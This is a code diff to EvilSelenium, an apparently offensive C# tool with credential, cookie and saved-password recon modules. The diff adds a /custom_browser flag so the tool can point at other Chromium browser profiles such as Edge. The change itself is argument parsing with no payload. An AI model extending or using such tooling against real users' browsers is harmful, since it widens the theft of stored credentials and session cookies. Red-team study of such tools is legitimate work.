@@ -3,6 +3,7 @@ using EvilSelenium.Misc;
 using EvilSelenium.Commands;
 using EvilSelenium.Credentials;
 using EvilSelenium.Cookies;
+using System.Collections.Generic;
 
 namespace EvilSelenium
 {
@@ -18,7 +19,8 @@ namespace EvilSelenium
             else if(args.Length > 0){
                 try
                 {
-                    if(args[0] == "/help" || args[0] == "/?")
+                    args = ParseGlobalFlags(args);
+                    if (args[0] == "/help" || args[0] == "/?")
                     {
                         UsageMenu();
                     }
@@ -152,6 +154,26 @@ namespace EvilSelenium
             
         }
 
+        public static string[] ParseGlobalFlags(string[] args)
+        {
+            List<string> arguments = new List<string>(args);
+            var custom_user_data_flag = arguments.IndexOf("/custom_browser");
+            // If flag is not shown - ignore
+            if (custom_user_data_flag == -1)
+                return args;
+            else if (args.Length >= custom_user_data_flag + 1)
+            {
+                Helpers.BrowserRouting = arguments[custom_user_data_flag + 1];
+                // Pop the flag value e.g. "Microsoft\Edge"
+                arguments.RemoveAt(custom_user_data_flag + 1);
+
+            }
+
+            // Pop the flag "/custom_browser"
+            arguments.RemoveAt(custom_user_data_flag);
+            return arguments.ToArray();
+        }
+
         public static void UsageMenu()
         {
             string usage = @"
@@ -160,6 +182,9 @@ namespace EvilSelenium
 
     SETUP:
     /install - Install chromedriver & Selenium webdriver. Run this once.
+
+    GLOBAL: (accepted with every command)
+    /custom_browser [appdata_local_routing] - Use custom browser, Input should be the routing inside %appdatalocal% dir (e.g. ""Microsoft\Edge"")
 
     RECON:
     /enumsavedsites [out_path] - Check which websites have passwords saved via screenshot(s).
